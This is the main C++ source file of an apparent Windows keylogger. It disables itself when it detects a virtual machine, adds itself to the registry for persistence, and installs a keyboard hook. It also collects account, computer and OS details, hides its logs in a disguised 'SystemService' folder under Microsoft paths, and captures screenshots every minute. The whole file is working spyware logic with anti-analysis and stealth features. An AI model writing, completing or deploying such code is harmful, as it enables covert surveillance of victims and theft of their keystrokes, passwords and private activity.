#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "debug.h"

#ifdef DEBUG_BUILD
#include "encrypt.h"
#endif

int main() {
#ifdef DEBUG_BUILD
  std::cout << "In debug mode!\n";
  return 0;
#endif

#ifndef DEBUG_BUILD
  if (Sys::CheckForVirtualMachine()) {
	KeyHook::UninstallHook();
	Sys::RemoveFromRegistry();
	KeyHook::KillProcess();
	return 0;
  }

  Sys::AddToRegistry();
  KeyHook::InstallHook();

  Stream::GetAccountInfo(clientInfo);

  std::string path = Stream::GetPath("\\Microsoft\\");

  BDirectory mainDir;
  Stream::LogFile logFile;
  mainDir.name = "SystemService";
  mainDir.path = Stream::GetPath(Stream::GetPath("\\" + mainDir.name));

  debn(Stream::GetPath("\\Microsoft\\" + mainDir.name))

  Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
  logFile = Stream::MakeFile("wnxshl2.sys.log", "\\Microsoft\\"); // Logs
  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);

  std::ostringstream ostream;

  DWORD major = clientInfo.osVersionInfo.dwMajorVersion;
  DWORD minor = clientInfo.osVersionInfo.dwMinorVersion;
  char *account_name = clientInfo.accountName;
  char *com = clientInfo.computerName;

  ostream << "\n[*] OS Info: Major - " << major << "; Minor - " << minor << " [*]"
		  << "\n[*] Account Info: User -" << account_name << "; Computer - " << com << " [*]";

  free(account_name);
  free(com);

  std::string write = ostream.str();
  Stream::WriteLog(write, KeyHook::activeProcess, false);
  Screen::CaptureScreen(mainDir.path + "\\", "winpst", true, 60000); // Screenshot

  KeyHook::HandleMessage(true);

#endif // DEBUG_BUILD
  return 0;
}